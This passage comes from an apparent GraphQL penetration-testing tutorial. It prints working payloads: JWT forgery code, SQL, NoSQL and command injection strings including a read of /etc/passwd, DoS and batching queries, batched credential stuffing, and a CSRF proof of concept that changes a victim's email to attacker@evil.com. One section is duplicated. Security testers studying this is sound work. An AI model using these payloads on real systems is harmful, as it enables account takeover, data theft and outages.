4. **If introspection is disabled, try these bypasses**:
   - URI case manipulation: `/GraphQL` instead of `/graphql`
   - Add custom headers: `X-Apollo-Tracing: 1`
   - Try partial introspection: `{ __type(name: "User") { name fields { name type { name } } } }`
   - Look for introspection data in JS bundles (search for "queryType" or "mutationType")
   - Try accessing development environment URLs (staging, dev, etc.)

InQL in Burp automates most of this, but manual exploration often reveals endpoints that automated tools miss.

### 3. Authentication Testing

GraphQL APIs often have unique authentication vulnerabilities:

1. **JWT token attacks**:
   - Check for weak signature verification (alg:none, RS/HS256 confusion)
   - Test token reuse across environments
   - Look for sensitive data in token claims
   - Try token replay without expiration
   - Test for missing validation of token claims
   
   Example attack query with forged token:
   ```
   POST /graphql HTTP/1.1
   Host: target.com
   Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
   Content-Type: application/json
   
   {"query": "query { adminSettings { serverConfig } }"}
   ```
   
   JWT forgery techniques:
   ```python
   # Algorithm confusion attack (RS256 to HS256)
   # 1. Decode the token without verification
   import jwt
   token = "eyJhbGciO..."
   header = jwt.get_unverified_header(token)
   payload = jwt.decode(token, options={"verify_signature": False})
   
   # 2. Modify claims
   payload["role"] = "admin"
   
   # 3. Change algorithm from RS256 to HS256 and sign with the public key
   # This works when the server doesn't validate the algorithm properly
   import base64
   with open("public_key.pem", "rb") as f:
       public_key = f.read()
   
   # Create forged token with HS256 algorithm using public key as the secret
   forged = jwt.encode(payload, public_key, algorithm="HS256", headers={"alg": "HS256"})
   
   # Another technique: "none" algorithm attack
   null_signed = jwt.encode(payload, "", algorithm="none", headers={"alg": "none"})
   ```
   
   Common JWT vulnerabilities:
   - Key disclosure in source code or JS files
   - Common/default secrets ("secret", "key", "SECRET_KEY")
   - Improper validation of "kid" header claim (path traversal)
   - Missing algorithm validation ("alg": "none" attacks)

2. **Session handling tests**:
   - Test session fixation vulnerabilities
   - Check if authentication state persists after logout
   - Test for race conditions in authentication flows
   - Check for missing invalidation of refresh tokens

3. **OAuth integration vulnerabilities**:
   - Test for SSRF in OAuth callbacks
   - Check for improper state validation
   - Look for token leakage in logs or URLs

### 4. Authorization Testing

Authorization bugs are extremely common in GraphQL APIs:

1. **Create multiple test users with different permission levels**:
   - Admin/superuser
   - Regular user
   - Restricted user
   - Unauthenticated access

2. **Object-level authorization tests**:
   - Attempt to access objects owned by other users
   - Test direct object reference vulnerabilities
   - Check for horizontal privilege escalation
   
   Example:
   ```graphql
   query {
     # Attempt to access another user's data
     user(id: "victim_id") {
       email
       profile {
         address
         phoneNumber
       }
     }
   }
   ```

3. **Field-level authorization tests**:
   - Identify sensitive fields (PII, financial data, etc.)
   - Test access to these fields across different user roles
   - Try accessing deprecated fields (often missed in access controls)
   
   Example:
   ```graphql
   query {
     # Try to access sensitive fields
     currentUser {
       username
       email
       hashedPassword # Might be exposed!
       internalNotes # Often overlooked in access controls
     }
   }
   ```

4. **Role-based authorization tests**:
   - Try to perform admin mutations as regular user
   - Check for missing authorization on custom operations
   - Test newly added fields which might be missed in authorization logic

5. **Common bypasses to try**:
   - Use aliases to request the same field multiple ways
   - Try camelCase variations of field names
   - Use fragments to obscure sensitive field requests
   - Use introspection to find non-UI fields that might lack authorization checks

### 5. Injection Testing

GraphQL resolvers often pass data directly to underlying systems, creating injection opportunities:

1. **SQL injection via GraphQL**:
   - Test string parameters in queries/mutations
   - Try classic SQL injection payloads adapted for GraphQL
   - Use Burp Intruder with GraphQL-specific payload positions
   
   Example in Burp Repeater:
   ```
   POST /graphql HTTP/1.1
   Host: target.com
   Content-Type: application/json
   
   {"query": "query { user(username: \"admin' OR 1=1 --\") { id username email } }"}
   ```

2. **NoSQL injection**:
   - Test for MongoDB operator injection
   - Try JSON parameter pollution in arguments
   
   Example (some implementations pass objects directly to MongoDB):
   ```graphql
   # This often doesn't work directly because GraphQL validates the type
   query {
     user(username: {$ne: null}) {
       id
       username
       email
     }
   }
   
   # More realistic payloads using string manipulation or variables
   # 1. Using string formatting to pass MongoDB operators
   query {
     user(username: "admin', $or: [ {}, { 'a':'a") {
       id
       username
     }
   }
   
   # 2. Using variables and JSON objects when variables aren't properly sanitized
   query ($username: JSON) {
     findUser(criteria: $username) {
       id
       email
     }
   }
   ```
   
   Variables payload:
   ```json
   {
     "username": {
       "$ne": null,
       "$regex": "^adm"
     }
   }
   ```

3. **OS command injection**:
   - Target mutations that might trigger server processes
   - Focus on file upload operations, URL processing, or system integration points
   
   Example:
   ```graphql
   mutation {
     generateReport(format: "pdf; cat /etc/passwd #") {
       downloadUrl
     }
   }
   ```

4. **Template injection**:
   - Look for operations that might use templates (email, exports, reports)
   - Test for SSTI in string parameters
   
   Example:
   ```graphql
   mutation {
     sendEmail(template: "Welcome, {{user.name}}! {{7*7}}", to: "test@example.com") {
       success
     }
   }
   ```

5. **GraphQL-specific injection**:
   - Try injecting fragments
   - Test for query batching issues
   - Look for variable injection points
   
6. **Variable coercion attacks**:
   - Exploit type conversion in GraphQL by providing unexpected types
   - Test Boolean/String/Int conversions for logic bypasses
   
   Example:
   ```graphql
   query ($isAdmin: Boolean!) {
     userInfo(includePrivate: $isAdmin) {
       email
       ssn
       salary
     }
   }
   ```
   Send with variables: `{"isAdmin": "true"}` instead of `{"isAdmin": true}`
   
   Why this works:
   Depending on the GraphQL implementation and resolver code, type coercion may happen differently:
   
   ```javascript
   // Vulnerable implementation in JavaScript
   function userInfoResolver(parent, args, context) {
     // The implementation uses loose equality (==) instead of strict (===)
     // "true" == true evaluates to true in JavaScript
     if (args.includePrivate == true && !context.user.isAdmin) {
       throw new Error("Unauthorized");
     }
     
     // Or using Boolean() which converts strings to boolean
     // Boolean("true") evaluates to true, Boolean("false") evaluates to true too!
     if (Boolean(args.includePrivate) && !context.user.isAdmin) {
       throw new Error("Unauthorized");
     }
     
     return db.getUserPrivateInfo(context.user.id);
   }
   ```
   
   Additional type coercion tests:
   - Input: `{"limit": "100"}` when expecting `Int`
   - Input: `{"filter": 1}` when expecting `String` or an object
   - Input: `{"flag": "0"}` when expecting `Boolean`

### 6. DoS and Resource Exhaustion

GraphQL is particularly vulnerable to DoS attacks:

1. **Nested query attacks**:
   - Create deeply nested queries using recursive types
   - Start with 5 levels and increase until you see performance impact
   
   Example:
   ```graphql
   query NestedQuery {
     user(id: "1") {
       friends {
         friends {
           friends {
             friends {
               friends {
                 friends {
                   # Keep nesting until server struggles
                   id
                   username
                 }
               }
             }
           }
         }
       }
     }
   }
   ```

2. **Query complexity bombs**:
   - Combine nested queries with field duplication
   - Request resource-intensive computed fields
   - Request large result sets
   
   Example:
   ```graphql
   query ComplexityBomb {
     allUsers(first: 10000) {  # Large result set
       posts(first: 100) {     # For each user
         comments(first: 100) { # For each post
           author {
             # Requesting the same expensive fields multiple times
             activityFeed { id }
             activityFeed { id }
             activityFeed { id }
             activityFeed { id }
             # ... repeat many times
           }
         }
       }
     }
   }
   ```

3. **Batch query flooding**:
   - Send multiple operations in a single request
   - Increase batch size until you find the limit or impact
   
   Example:
   ```
   POST /graphql HTTP/1.1
   Host: target.com
   Content-Type: application/json
   
   [
     {"query": "query { user(id: \"1\") { username } }"},
     {"query": "query { user(id: \"2\") { username } }"},
     ... 
     # Repeat hundreds or thousands of times
   ]
   ```

4. **Field duplication attacks**:
   - Request the same field thousands of times
   - Focus on computationally expensive fields
   
   Example:
   ```graphql
   query {
     user(id: "1") {
       # Request the same field many times
       email email email email email email
       # ... repeat hundreds of times
     }
   }
   ```

5. **Resource-intensive operations**:
   - Identify and target expensive operations like:
     - Search functionality
     - Filtering large datasets
     - Geospatial queries
     - Data aggregation
   
   Example:
   ```graphql
   query {
     # Full-text search with minimal query to return maximum results
     search(query: "a") {
       id
       title
       content
     }
   }
   ```

### 7. Batching Attacks

Batch operations can be exploited for various attacks:

1. **Rate limit bypass**:
   - Identify rate-limited operations
   - Bundle them in a single batched request
   - Check if the rate limit applies per-request or per-operation
   
   Example:
   ```
   POST /graphql HTTP/1.1
   Host: target.com
   Content-Type: application/json
   
   [
     {"query": "mutation { sendMessage(to: \"user1\", content: \"test\") { id } }"},
     {"query": "mutation { sendMessage(to: \"user2\", content: \"test\") { id } }"},
     {"query": "mutation { sendMessage(to: \"user3\", content: \"test\") { id } }"},
     ... # Keep adding until you exceed what would normally be rate-limited
   ]
   ```

2. **Credential stuffing**:
   - Bundle multiple login attempts in one request
   - Watch for response variations that indicate valid credentials
   
   Example:
   ```
   POST /graphql HTTP/1.1
   Host: target.com
   Content-Type: application/json
   
   [
     {"query": "mutation { login(username: \"admin\", password: \"password1\") { token } }"},
     {"query": "mutation { login(username: \"admin\", password: \"password2\") { token } }"},
     ... # Test multiple passwords in one request
   ]
   ```

3. **Query smuggling**:
   - Hide malicious operations among legitimate ones
   - Use this to bypass WAF or logging mechanisms
   
   Example:
   ```
   POST /graphql HTTP/1.1
   Host: target.com
   Content-Type: application/json
   
   [
     {"query": "query { publicPosts { id title } }"}, # Legitimate operation
     {"query": "query { userEmails { email role hashedPassword } }"}, # Malicious operation
     {"query": "query { publicEvents { id date } }"} # Legitimate operation
   ]
   ```

### 8. CSRF Testing

GraphQL endpoints are often vulnerable to CSRF:

1. **Identify state-changing mutations**:
   - Look for operations that update user data
   - Focus on high-impact operations like:
     - Password/email changes
     - Account settings
     - Financial transactions
     - Data deletion

2. **Test for GET-based GraphQL support**:
   - Some implementations support queries via GET params
   - This makes CSRF trivial
   
   Example:
   ```
   <img src="https://target.com/graphql?query=mutation{changeEmail(email:%22attacker@evil.com%22){success}}" style="display:none">
   ```

3. **Test for missing CSRF protections**:
   - Check if the API relies solely on cookies for authentication
   - Verify if CSRF tokens are validated for GraphQL operations
   
   Example PoC:
   ```html
   <html>
     <body onload="document.forms[0].submit()">
       <form action="https://target.com/graphql" method="POST" enctype="text/plain">
         <input name='{"query":"mutation{changeEmail(email:\"attacker@evil.com\"){success}}"}' value='abc'>
       </form>
     </body>
   </html>
   ```

### 9. Advanced Techniques

For hardened GraphQL APIs, try these advanced approaches:

1. **Query fingerprinting evasion**:
   - Modify query structure while preserving functionality
   - Use aliases to rename operations
   - Add/remove whitespace and comments
   - Split complex queries into simpler ones

2. **Persisted query exploitation**:
   - Look for hash-based persisted query implementations
   - Try hash collision attacks
   - Test for hash bypass techniques
   - Use timing attacks to discover valid hashes

3. **GraphQL directive abuse**:
   - Test for insecure custom directives
   - Try using internal directives in unexpected contexts
   - Look for directive-based authorization bypasses
   
   Examples:
   ```graphql
   # 1. Using @skip or @include to bypass access controls
   query {
     sensitiveData @skip(if: false) {
       internalFields
     }
     # Some implementations check auth at the query level but not for skipped fields
   }
   
   # 2. Exploiting real-world custom directives
   query {
     user(id: "admin") {
       # Apollo federation exposes _entities queries that might bypass auth
       _entities(representations: [{__typename: "User", id: "admin"}]) {
         ... on User {
           email
           role
         }
       }
     }
   }
   
   # 3. Directive parameter injection in implementations using dynamic resolvers
   query {
     documents {
       content @transform(expression: "file:///etc/passwd")
     }
   }
   
   # 4. Auth context leakage through directives
   query {
     public {
       data @authenticate
       # In some implementations, @authenticate may store auth context in a way
       # that affects subsequent field resolution
     }
   }
   ```
   
   In the wild, directive vulnerabilities have been found in:
   - Custom GraphQL servers that implement dynamic expression evaluation
   - APIs that use directives for formatting/transformation but fail to sanitize inputs
   - Implementations where directive execution happens before field-level authorization
   - Federation setups where directives are implemented inconsistently across services

4. **Subscription vulnerabilities**:
   - Test for unbounded subscriptions
   - Check for missing authentication on subscription operations
   - Try to subscribe to other users' events
   
   Example:
   ```graphql
   subscription {
     userUpdates(userId: "victim_id") {
       email
       activity
     }
   }
   ```

5. **Federation vulnerabilities**:
   - Test for inconsistent authorization between federated services
   - Check for information leakage in subgraph responses
   - Exploit entity resolution misconfigurations
   
   Real-world examples:
   ```graphql
   # 1. Exploiting inconsistent auth in a microservices architecture
   # A real case where User service required JWT but Products service only checked
   # if any JWT was present without validating user permissions
   query ProductLeakage {
     product(id: "classified-product-1337") {
       name
       price
       internalManufacturingCost  # Should be admin-only field
     }
   }
   
   # 2. Entity resolution bypass found in production
   # Gateway expected ID to be a UUID but subgraph accepted string format too
   query EntityResolutionBypass {
     node(id: "user-1 UNION SELECT * FROM admin_users--") {
       ... on User {
         username
         email
       }
     }
   }
   
   # 3. Documented gateway bypass in a financial company
   # Sending to https://payments.internal-api.company.com:8443/graphql
   # instead of https://api.company.com/graphql bypassed IP restrictions
   query DirectSubgraphAccess {
     processCreditCard(input: {
       cardNumber: "4111111111111111",
       cvv: "123"
     }) {
       success
     }
   }
   
   # 4. Observed type extension confusion vulnerability
   query TypeExtensionConfusion {
     product(id: "1") {
       name
       # Product type was defined in main subgraph with proper auth
       
       reviews {
         # Reviews subgraph extended Product but implemented different
         # auth checks, leading to leak of embargoed reviews
         embargoed
         unreleased
       }
     }
   }
   ```
   
   Federation vulnerabilities discovered in production often involve:
   - Authentication verification occuring at gateway but authorization in subgraphs
   - JWT validation differences between gateway and subgraphs
   - Direct subgraph exposure (services accessible directly, bypassing gateway)
   - Entity key validation differences (UUID vs string vs int)

6. **Variable coercion attacks**:
   - Exploit type conversion in GraphQL by providing unexpected types
   - Test Boolean/String/Int conversions for logic bypasses
   
   Example:
   ```graphql
   query ($isAdmin: Boolean!) {
     userInfo(includePrivate: $isAdmin) {
       email
       ssn
       salary
     }
   }
   ```
   Send with variables: `{"isAdmin": "true"}` instead of `{"isAdmin": true}`

### 10. Real-World Attack Chaining

The most devastating GraphQL attacks chain multiple vulnerabilities:

1. **Introspection to data leak to account takeover**:
   - Map the API with introspection
   - Find and exploit an injection vulnerability
   - Extract sensitive data or authentication material
   - Use this to elevate privileges or take over accounts

2. **DoS to injection to privilege escalation**:
   - Create DoS conditions to trigger error states
   - Use error messages to gather information
   - Leverage timing attacks during DoS to extract data
   - Use extracted data to gain higher privileges

3. **Batching + injection + CSRF**:
   - Use batching to bypass rate limits
   - Chain with injection to extract CSRF tokens
   - Create CSRF exploits using the extracted tokens
   - Bundle everything in a deliverable attack package

Document your attack chains carefully - they're often the most convincing demonstrations of impact.

## Conclusion

GraphQL gives security testers a massive attack surface to work with. The same features that make it attractive to developers create openings for us to exploit. From conducting initial reconnaissance through introspection, to injecting malicious queries, to performing nested query DoS attacks - GraphQL offers many paths to compromise.

Remember that most GraphQL deployments are still immature from a security perspective. Developers are focused on functionality first, with security as an afterthought. This means you'll often find multiple vulnerabilities in a single API that can be chained together for maximum impact.

The most effective attack strategies combine multiple techniques. Start with introspection to map the API, use injection techniques to extract sensitive data, leverage batching to bypass rate limits, and if all else fails, hit them with resource-intensive queries to impact availability.

When testing GraphQL APIs, always look beyond the obvious. That email field might expose more than just the address if you inject the right payload. That simple query might return admin data if you bypass object-level checks. That innocent-looking mutation might affect more than what's documented.

The best part about attacking GraphQL is that many traditional protections don't apply. WAFs often struggle with GraphQL's flexible format. Authentication schemes that work for REST often break down with GraphQL's single endpoint model. And many GraphQL servers still have introspection enabled in production, essentially handing you the keys to the kingdom.

Whether it's API mapping, data exfiltration, or full account takeover, GraphQL offers plenty of opportunities for creative attacks. Use the techniques in this article to thoroughly test GraphQL implementations and demonstrate real impact to your clients or organization.

Happy hacking! 

---

*Disclaimer: This article is provided for educational purposes only. The techniques described should only be used in authorized environments and security research contexts. Always follow responsible disclosure practices and operate within legal and ethical boundaries.*
